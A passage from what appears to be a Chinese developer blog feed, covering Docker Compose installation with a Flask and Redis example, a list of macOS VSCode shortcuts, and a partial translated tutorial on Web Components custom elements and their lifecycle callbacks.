<h2 id="Compose-安装"><a href="#Compose-安装" class="headerlink" title="Compose 安装"></a>Compose 安装</h2><p>Linux 上运行以下命令以下载 Docker Compose 的某个稳定版本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<p>将可执行权限应用于二进制文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<p>创建软链：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure>
<p>测试是否安装成功：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker-compose --version</span><br><span class="line">cker-compose version 1.24.1, build 4667896b</span><br></pre></td></tr></table></figure>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="1、准备"><a href="#1、准备" class="headerlink" title="1、准备"></a>1、准备</h3><p>创建一个测试目录composetest,在测试目录中创建一个名为 app.py 的文件，并复制粘贴以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line"></span><br><span class="line">import redis</span><br><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">cache = redis.Redis(host=&apos;redis&apos;, port=6379)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_hit_count():</span><br><span class="line">    retries = 5</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            return cache.incr(&apos;hits&apos;)</span><br><span class="line">        except redis.exceptions.ConnectionError as exc:</span><br><span class="line">            if retries == 0:</span><br><span class="line">                raise exc</span><br><span class="line">            retries -= 1</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def hello():</span><br><span class="line">    count = get_hit_count()</span><br><span class="line">    return &apos;Hello World! I have been seen &#123;&#125; times.\n&apos;.format(count)</span><br></pre></td></tr></table></figure>
<p>在此示例中，redis 是应用程序网络上的 redis 容器的主机名，该主机使用的端口为 6379。</p>
<p>在 composetest 目录中创建另一个名为 requirements.txt 的文件，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flask</span><br><span class="line">redis</span><br></pre></td></tr></table></figure>
<h3 id="2、创建-Dockerfile-文件"><a href="#2、创建-Dockerfile-文件" class="headerlink" title="2、创建 Dockerfile 文件"></a>2、创建 Dockerfile 文件</h3><p>在 composetest 目录中，创建一个名为的文件 Dockerfile，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM python:3.7-alpine</span><br><span class="line">WORKDIR /code</span><br><span class="line">ENV FLASK_APP app.py</span><br><span class="line">ENV FLASK_RUN_HOST 0.0.0.0</span><br><span class="line">RUN apk add --no-cache gcc musl-dev linux-headers</span><br><span class="line">COPY requirements.txt requirements.txt</span><br><span class="line">RUN pip install -r requirements.txt</span><br><span class="line">COPY . .</span><br><span class="line">CMD [&quot;flask&quot;, &quot;run&quot;]</span><br></pre></td></tr></table></figure>
<p>Dockerfile 内容解释：</p>
<ul>
<li>FROM python:3.7-alpine: 从 Python 3.7 映像开始构建镜像。</li>
<li>WORKDIR /code: 将工作目录设置为 /code。</li>
<li>ENV设置 flask 命令使用的环境变量。</li>
<li>RUN apk add –no-cache gcc musl-dev linux-headers: 安装 gcc，以便诸如 MarkupSafe 和 SQLAlchemy 之类的 Python 包可以编译加速。</li>
<li>COPY requirements.txt requirements.txt和RUN pip install -r requirements.txt，复制 requirements.txt 并安装 Python 依赖项。</li>
<li>COPY . .: 将 . 项目中的当前目录复制到 . 镜像中的工作目录。</li>
<li>CMD [“flask”, “run”]: 容器提供默认的执行命令为：flask run。</li>
</ul>
<h3 id="3、创建-docker-compose-yml"><a href="#3、创建-docker-compose-yml" class="headerlink" title="3、创建 docker-compose.yml"></a>3、创建 docker-compose.yml</h3><p>在测试目录中创建一个名为 docker-compose.yml 的文件，然后粘贴以下内容：</p>
<p>docker-compose.yml 配置文件</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yaml 配置</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">"5000:5000"</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">"redis:alpine"</span></span><br></pre></td></tr></table></figure>
<p>该 Compose 文件定义了两个服务：web 和 redis。</p>
<p>web：该 web 服务使用从 Dockerfile 当前目录中构建的镜像。然后，它将容器和主机绑定到暴露的端口 5000。此示例服务使用 Flask Web 服务器的默认端口 5000 。</p>
<p>redis：该 redis 服务使用 Docker Hub 的公共 Redis 映像。</p>
<h3 id="4、使用-Compose-命令构建和运行您的应用"><a href="#4、使用-Compose-命令构建和运行您的应用" class="headerlink" title="4、使用 Compose 命令构建和运行您的应用"></a>4、使用 Compose 命令构建和运行您的应用</h3><p>在测试目录中，执行以下命令来启动应用程序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>
<p>如果你想在后台执行该服务可以加上 -d 参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>VSCode快捷键</title>
    <url>/2021/05/25/vscode%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[<h1 id="编辑器相关"><a href="#编辑器相关" class="headerlink" title="编辑器相关"></a>编辑器相关</h1><h2 id="1-搜索文件、文件夹"><a href="#1-搜索文件、文件夹" class="headerlink" title="1.搜索文件、文件夹"></a>1.搜索文件、文件夹</h2><p>Command + P</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/1%E6%90%9C%E7%B4%A2%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9.gif" alt></p>
<h2 id="2-搜索所有文件的文本"><a href="#2-搜索所有文件的文本" class="headerlink" title="2.搜索所有文件的文本"></a>2.搜索所有文件的文本</h2><p>Command + Shift + F</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/2%E6%90%9C%E7%B4%A2%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%87%E6%9C%AC.gif" alt></p>
<h2 id="3-切换工作区（项目）"><a href="#3-切换工作区（项目）" class="headerlink" title="3.切换工作区（项目）"></a>3.切换工作区（项目）</h2><p>CTRL + R</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/3%E5%88%87%E6%8D%A2%E5%B7%A5%E4%BD%9C%E5%8C%BA%EF%BC%88%E9%A1%B9%E7%9B%AE%EF%BC%89.gif" alt></p>
<h2 id="4-切换tab（文件）"><a href="#4-切换tab（文件）" class="headerlink" title="4.切换tab（文件）"></a>4.切换tab（文件）</h2><p>CTRL + TAB</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/4%E5%88%87%E6%8D%A2tab%EF%BC%88%E6%96%87%E4%BB%B6%EF%BC%89.gif" alt></p>
<h2 id="5-分屏"><a href="#5-分屏" class="headerlink" title="5.分屏"></a>5.分屏</h2><p>Command + \ </p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/5%E5%88%86%E5%B1%8F.gif" alt></p>
<h2 id="6-快速打开和关闭侧边栏"><a href="#6-快速打开和关闭侧边栏" class="headerlink" title="6.快速打开和关闭侧边栏"></a>6.快速打开和关闭侧边栏</h2><p>Command + B </p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/6%E5%BF%AB%E9%80%9F%E6%89%93%E5%BC%80%E5%92%8C%E5%85%B3%E9%97%AD%E4%BE%A7%E8%BE%B9%E6%A0%8F.gif" alt></p>
<h2 id="7-打开集成终端「Open-new-Terminal」"><a href="#7-打开集成终端「Open-new-Terminal」" class="headerlink" title="7.打开集成终端「Open new Terminal」"></a>7.打开集成终端「Open new Terminal」</h2><p>Control + ` </p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/7%E6%89%93%E5%BC%80%E9%9B%86%E6%88%90%E7%BB%88%E7%AB%AF%E3%80%8COpen%20new%20Terminal%E3%80%8D.gif" alt></p>
<h1 id="代码编写相关"><a href="#代码编写相关" class="headerlink" title="代码编写相关"></a>代码编写相关</h1><h2 id="8-选中当前行"><a href="#8-选中当前行" class="headerlink" title="8.选中当前行"></a>8.选中当前行</h2><p>⌘ + L</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/8%E9%80%89%E4%B8%AD%E5%BD%93%E5%89%8D%E8%A1%8C.gif" alt></p>
<h2 id="9-删除当前行"><a href="#9-删除当前行" class="headerlink" title="9.删除当前行"></a>9.删除当前行</h2><p>Command + X</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/9%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E8%A1%8C.gif" alt></p>
<h2 id="10-删除光标前面的代码（当前行）"><a href="#10-删除光标前面的代码（当前行）" class="headerlink" title="10.删除光标前面的代码（当前行）"></a>10.删除光标前面的代码（当前行）</h2><p>Command + Delete</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/10%E5%88%A0%E9%99%A4%E5%85%89%E6%A0%87%E5%89%8D%E9%9D%A2%E7%9A%84%E4%BB%A3%E7%A0%81%EF%BC%88%E5%BD%93%E5%89%8D%E8%A1%8C%EF%BC%89.gif" alt></p>
<h2 id="11-快速到行首-行尾"><a href="#11-快速到行首-行尾" class="headerlink" title="11.快速到行首/行尾"></a>11.快速到行首/行尾</h2><p>Command + ← / →</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/11%E5%BF%AB%E9%80%9F%E5%88%B0%E8%A1%8C%E9%A6%96%3A%E8%A1%8C%E5%B0%BE.gif" alt></p>
<h2 id="12-局部选择"><a href="#12-局部选择" class="headerlink" title="12.局部选择"></a>12.局部选择</h2><p>首先选中你需要的单词，然后按下面的快捷键即可：</p>
<p>Command + D</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/12%E5%B1%80%E9%83%A8%E9%80%89%E6%8B%A9.gif" alt></p>
<h2 id="13-全局选择"><a href="#13-全局选择" class="headerlink" title="13.全局选择"></a>13.全局选择</h2><p>首先选中你需要的单词，然后按下面的快捷键即可：</p>
<p>Command + Shift + L</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/13%E5%85%A8%E5%B1%80%E9%80%89%E6%8B%A9.gif" alt></p>
<h2 id="14-选中一行中的部分代码"><a href="#14-选中一行中的部分代码" class="headerlink" title="14.选中一行中的部分代码"></a>14.选中一行中的部分代码</h2><p>Command + Shift + ← / →</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/14%E9%80%89%E4%B8%AD%E4%B8%80%E8%A1%8C%E4%B8%AD%E7%9A%84%E9%83%A8%E5%88%86%E4%BB%A3%E7%A0%81.gif" alt></p>
<h2 id="15-往上-下添加光标"><a href="#15-往上-下添加光标" class="headerlink" title="15.往上/下添加光标"></a>15.往上/下添加光标</h2><p>Command + Option + ↑ / ↓</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/15%E5%BE%80%E4%B8%8A%3A%E4%B8%8B%E6%B7%BB%E5%8A%A0%E5%85%89%E6%A0%87.gif" alt></p>
<h2 id="16-多行选中"><a href="#16-多行选中" class="headerlink" title="16.多行选中"></a>16.多行选中</h2><p>需配合鼠标一起使用，按住快捷键，使用鼠标点击需要的行</p>
<p>Shift + Option</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/16%E5%A4%9A%E8%A1%8C%E9%80%89%E4%B8%AD.gif" alt></p>
<h2 id="17-往上-下复制行"><a href="#17-往上-下复制行" class="headerlink" title="17.往上/下复制行"></a>17.往上/下复制行</h2><p>Shift + Option + ⬆️ / ⬇️</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/17%E5%BE%80%E4%B8%8A%3A%E4%B8%8B%E5%A4%8D%E5%88%B6%E8%A1%8C.gif" alt></p>
<h2 id="18-代码折叠和展开"><a href="#18-代码折叠和展开" class="headerlink" title="18.代码折叠和展开"></a>18.代码折叠和展开</h2><p>折叠：Command + Option + [<br>展开：Command + Option + ]</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/18%E4%BB%A3%E7%A0%81%E6%8A%98%E5%8F%A0%E5%92%8C%E5%B1%95%E5%BC%80.gif" alt></p>
<h2 id="19-跳转到指定行数"><a href="#19-跳转到指定行数" class="headerlink" title="19.跳转到指定行数"></a>19.跳转到指定行数</h2><p>Command + P 打开编辑器命令，然后输入: ，再输入行数即可。</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/19%E8%B7%B3%E8%BD%AC%E5%88%B0%E6%8C%87%E5%AE%9A%E8%A1%8C%E6%95%B0.gif" alt></p>
<h2 id="20-文件中跳转特定符号"><a href="#20-文件中跳转特定符号" class="headerlink" title="20.文件中跳转特定符号"></a>20.文件中跳转特定符号</h2><p>Command + Shift + O</p>
<p>在比较大的代码文件中，能让我们快速找到想要编辑的方法、属性或者类.</p>
<p>加上@，还可以分类展示所有符号</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/vscode-shortcuts/gif/20%E6%96%87%E4%BB%B6%E4%B8%AD%E8%B7%B3%E8%BD%AC%E7%89%B9%E5%AE%9A%E7%AC%A6%E5%8F%B7.gif" alt></p>
<h2 id="21-重命名符号"><a href="#21-重命名符号" class="headerlink" title="21.重命名符号"></a>21.重命名符号</h2><p>选中一个，然后按：</p>
<p>F2</p>
]]></content>
  </entry>
  <entry>
    <title>web-components</title>
    <url>/2021/06/26/web-components/</url>
    <content><![CDATA[<p>【Chrome官方文章翻译】可重用的Web Components</p>
<p>可重用的Web Components</p>
<p>Web Components可以让开发者<code>创造标签</code>，开发者可以增强现有HTML标签，扩展其他开发者编写的标签。</p>
<p>它提供了基于web标准的方式，可以让你用少量的、模块化的代码去编写可重用的组件。</p>
<h2 id="定义一个新元素"><a href="#定义一个新元素" class="headerlink" title="定义一个新元素"></a>定义一个新元素</h2><p>使用window.customElements.define可以定义一个新元素。</p>
<p>它的第一个参数是标签名，第二个参数是一个继承HTMLElement的类。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppDrawer</span> <span class="keyword">extends</span> <span class="title">HTMLElement</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.customElements.define(<span class="string">'app-drawer'</span>, AppDrawer);</span><br></pre></td></tr></table></figure>
<p>那么如何使用它呢？你只要像使用正常的html标签一样使用它就可以了！</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Web Components<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app-drawer</span>&gt;</span>app-drawer<span class="tag">&lt;/<span class="name">app-drawer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="class"><span class="keyword">class</span> <span class="title">AppDrawer</span> <span class="keyword">extends</span> <span class="title">HTMLElement</span> </span>&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.customElements.define(<span class="string">"app-drawer"</span>, AppDrawer);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>自定义的元素和普通的HTML元素没有区别。它的实例可以在页面中声明，然后使用JS定义它。它也可以使用事件监听等HTML元素具有的特性。这在后面将会详细介绍。</p>
<h2 id="自定义元素的JS-API"><a href="#自定义元素的JS-API" class="headerlink" title="自定义元素的JS API"></a>自定义元素的JS API</h2><p>自定义元素的功能使用ES2015 class实现，由于它继承了HTMLElement，所以拥有完整的DOM API。这也意味着JS里的属性、方法成了DOM接口的一部分，就像是我们在用JS为标签创建API。</p>
<p>例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppDrawer</span> <span class="keyword">extends</span> <span class="title">HTMLElement</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// A getter/setter for an open property.</span></span><br><span class="line">  <span class="keyword">get</span> open() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.hasAttribute(<span class="string">'open'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">set</span> open(val) &#123;</span><br><span class="line">    <span class="comment">// Reflect the value of the open property as an HTML attribute.</span></span><br><span class="line">    <span class="keyword">if</span> (val) &#123;</span><br><span class="line">      <span class="keyword">this</span>.setAttribute(<span class="string">'open'</span>, <span class="string">''</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.removeAttribute(<span class="string">'open'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.toggleDrawer();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Can define constructor arguments if you wish.</span></span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="comment">// If you define a constructor, always call super() first!</span></span><br><span class="line">    <span class="comment">// This is specific to CE and required by the spec.</span></span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup a click listener on &lt;app-drawer&gt; itself.</span></span><br><span class="line">    <span class="keyword">this</span>.addEventListener(<span class="string">'click'</span>, e =&gt; &#123;</span><br><span class="line">      <span class="keyword">this</span>.toggleDrawer();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  toggleDrawer() &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">customElements.define(<span class="string">'app-drawer'</span>, AppDrawer);</span><br></pre></td></tr></table></figure>
<p>在这个例子中，我们创建了拥有open属性和toggleDrawer()方法的app-drawer元素。</p>
<p>在定义元素的class语法中，this指向元素本身。在这个例子中它可以获取属性、监听事件。其实其他DOM API它都可以使用，比如获取children(this.children)、选择元素（this.querySelectorAll(‘.items’)）等等。</p>
<h3 id="自定义元素命名规则"><a href="#自定义元素命名规则" class="headerlink" title="自定义元素命名规则"></a>自定义元素命名规则</h3><ol>
<li><p>必须包含破折号（-），这是为了区分自定义元素和HTML元素，并且确保兼容性（即使HTML增加新标签也不会导致冲突）</p>
</li>
<li><p>不能重复注册相同标签，否则会抛DOMException，因为这完全没必要。</p>
</li>
<li><p>不支持自闭合标签的写法，因为在HTML规范里只有一些标签是允许自闭合的。所以只有<code>&lt;app-drawer&gt;&lt;/app-drawer&gt;</code>这样写才是正确的。</p>
</li>
</ol>
<h2 id="自定义元素的生命周期（custom-element-reactions）"><a href="#自定义元素的生命周期（custom-element-reactions）" class="headerlink" title="自定义元素的生命周期（custom element reactions）"></a>自定义元素的生命周期（custom element reactions）</h2><p>自定义元素有它的生命周期hooks。罗列如下：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>触发时机</th>
</tr>
</thead>
<tbody>
<tr>
<td>constructor</td>
<td>实例被创建或升级时执行，通常用来初始化一些状态、设置事件监听或者创建shadow dom</td>
</tr>
<tr>
<td>connectedCallback</td>
<td>当元素被添加到DOM中触发，通常在这个时候进行数据请求等</td>
</tr>
<tr>
<td>disconnectedCallback</td>
<td>元素在DOM中被移除时触发，通常做一些清理操作</td>
</tr>
<tr>
<td>attributeChangedCallback(attrName, oldVal, newVal)</td>
<td>当监听的属性（在observedAttributes属性列表中）被增加、删除、更新、替换时触发。在元素被解析器创建或升级相应属性值初始化时也会触发</td>
</tr>
<tr>
<td>adoptedCallback</td>
<td>元素被移动到一个新文档中触发（如：调用document.adoptNode(el))）</td>
</tr>
</tbody>
</table>
<p>例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppDrawer</span> <span class="keyword">extends</span> <span class="title">HTMLElement</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">super</span>(); <span class="comment">// always call super() first in the constructor.</span></span><br><span class="line">  &#125;</span><br><span class="line">  connectedCallback() &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  disconnectedCallback() &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  attributeChangedCallback(attrName, oldVal, newVal) &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回调函数是同步的。比如当调用el.setAttribute()，attributeChangedCallback()会立刻执行。</p>
<p>这些回调函数不是在所有情况下都是可靠的，比如用户关闭标签页时disconnectedCallback不会执行。</p>
<h2 id="JS和HTML属性"><a href="#JS和HTML属性" class="headerlink" title="JS和HTML属性"></a>JS和HTML属性</h2><h3 id="使用JS设置HTML属性"><a href="#使用JS设置HTML属性" class="headerlink" title="使用JS设置HTML属性"></a>使用JS设置HTML属性</h3><p>使用JS设置HTML属性是很常见的，比如在JS中执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.id = <span class="string">'my-id'</span>;</span><br><span class="line">div.hidden = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>html属性就会变为</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">"my-id"</span> hidden&gt;</span><br></pre></td></tr></table></figure>
<p>这是很有用的功能。比如你想实现样式根据JS状态改变。</p>
<p>在下面这个例子中我们可以通过点击切换app-drawer元素的透明度，并为它设置一些属性。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Web Components<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">app-drawer</span><span class="selector-attr">[disabled]</span> &#123;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">opacity</span>: 0<span class="selector-class">.5</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    app-drawer &#123;</span><br><span class="line">      opacity: 1;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app-drawer</span>&gt;</span>app-drawer<span class="tag">&lt;/<span class="name">app-drawer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="class"><span class="keyword">class</span> <span class="title">AppDrawer</span> <span class="keyword">extends</span> <span class="title">HTMLElement</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">static</span> <span class="keyword">get</span> observedAttributes() &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> [<span class="string">"disabled"</span>];</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">get</span> disabled() &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="keyword">this</span>.hasAttribute(<span class="string">"disabled"</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">set</span> disabled(val) &#123;</span></span><br><span class="line">          if (val) &#123;</span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.setAttribute(<span class="string">"disabled"</span>, <span class="string">""</span>);</span></span><br><span class="line"><span class="javascript">          &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.removeAttribute(<span class="string">"disabled"</span>);</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// Only called for the disabled and open attributes due to observedAttributes</span></span></span><br><span class="line">        attributeChangedCallback(name, oldValue, newValue) &#123;</span><br><span class="line"><span class="javascript">          <span class="comment">// When the drawer is disabled, update keyboard/screen reader behavior.</span></span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (<span class="keyword">this</span>.disabled) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.setAttribute(<span class="string">"tabindex"</span>, <span class="string">"-1"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.setAttribute(<span class="string">"aria-disabled"</span>, <span class="string">"true"</span>);</span></span><br><span class="line"><span class="javascript">          &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.setAttribute(<span class="string">"tabindex"</span>, <span class="string">"0"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.setAttribute(<span class="string">"aria-disabled"</span>, <span class="string">"false"</span>);</span></span><br><span class="line">          &#125;</span><br><span class="line"><span class="javascript">          <span class="comment">// <span class="doctag">TODO:</span> also react to the open attribute changing.</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// Can define constructor arguments if you wish.</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">constructor</span>() &#123;</span></span><br><span class="line"><span class="javascript">          <span class="comment">// If you define a constructor, always call super() first!</span></span></span><br><span class="line"><span class="javascript">          <span class="comment">// This is specific to CE and required by the spec.</span></span></span><br><span class="line"><span class="javascript">          <span class="keyword">super</span>();</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">          <span class="comment">// Setup a click listener on &lt;app-drawer&gt; itself.</span></span></span><br><span class="line"><span class="javascript">          <span class="keyword">this</span>.addEventListener(<span class="string">"click"</span>, e =&gt; &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.toggleDrawer();</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        toggleDrawer() &#123;</span><br><span class="line"><span class="javascript">          <span class="keyword">this</span>.disabled = <span class="built_in">Math</span>.random() &gt; <span class="number">0.5</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      customElements.define(<span class="string">"app-drawer"</span>, AppDrawer);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="元素升级"><a href="#元素升级" class="headerlink" title="元素升级"></a>元素升级</h2><p>我们前面学习了使用customElements.define定义元素，它的定义和注册（使用）是一起的，但其实你可以在定义之前就注册（使用）这个元素。也就说你先注册<code>&lt;app-drawer&gt;</code>，但不执行<code>customElements.define(&#39;app-drawer&#39;, ...)</code>也是可以的。</p>
<p>因为浏览器对未知标签会区别对待。</p>
<p>如果你先元素标签，后面再调用define()方法定义元素，这种方式就叫做元素升级。</p>
<p>你可以使用<code>window.customElements.whenDefined()</code>方法来监听元素在什么时候被定义。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">customElements.whenDefined(<span class="string">'app-drawer'</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'app-drawer defined'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
